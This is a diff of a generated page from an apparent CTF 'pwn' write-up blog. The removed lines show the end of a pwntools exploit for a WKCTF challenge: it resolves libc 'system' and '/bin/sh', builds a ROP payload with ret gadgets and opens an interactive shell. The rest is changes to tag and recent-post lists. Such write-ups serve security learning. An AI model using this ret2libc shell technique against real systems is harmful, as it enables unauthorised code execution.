-system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
-binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000003f8e8</span>
-nop_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000001b5a8</span>
-
-
-
-
-sla<span class="token punctuation">(</span><span class="token string">"How many bytes do you want to read (max 256)?"</span><span class="token punctuation">,</span><span class="token string">"256"</span><span class="token punctuation">)</span>
-
-
-payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>nop_ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> 
-payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span><span class="token string">b'\x61'</span><span class="token punctuation">)</span>
-
-<span class="token comment"># g(p)</span>
-s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-
-<span class="token comment"># g(p)</span>
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
-
-<h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2>
-	
-	</div>
-  <a type="button" href="/2024/07/15/wkctf-pwn/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1775,43 +1946,43 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 		
 			<li><a href="/tags/shellcode/">shellcode<span>5</span></a></li>
 		
-			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
-		
-			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/misc/">misc<span>1</span></a></li>
-		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
-		
-			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
-		
-			<li><a href="/tags/fmt/">fmt<span>7</span></a></li>
-		
-			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
-		
-			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
-		
-			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
+			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
 		
 			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
 		
-			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
+			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/rust/">rust<span>1</span></a></li>
-		
-			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
-		
-			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
+			<li><a href="/tags/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
 		
 			<li><a href="/tags/tls/">tls<span>1</span></a></li>
 		
-			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
+			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
+		
+			<li><a href="/tags/rust/">rust<span>1</span></a></li>
+		
+			<li><a href="/tags/fmt/">fmt<span>7</span></a></li>
+		
+			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
+		
+			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>13</span></a></li>
+		
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
+		
+			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
+		
+			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
+		
+			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+		
+			<li><a href="/tags/iot/">iot<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>24</span></a></li>
@@ -1827,6 +1998,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2025/10/03/ysyx-f3数电基础/" ><i class="fa fa-file-o"></i>ysyx_f3数电基础</a>
+      </li>
+    
+      <li>
         <a href="/2025/09/15/rust1/" ><i class="fa fa-file-o"></i>rust语法基础1</a>
       </li>
     
@@ -1840,10 +2015,6 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     
       <li>
         <a href="/2025/04/29/hackergame2024复现/" ><i class="fa fa-file-o"></i>hackergame2024复现</a>
-      </li>
-    
-      <li>
-        <a href="/2025/04/09/Squ1rrelCTF/" ><i class="fa fa-file-o"></i>Squ1rrelCTF</a>
       </li>
     
   </ul>
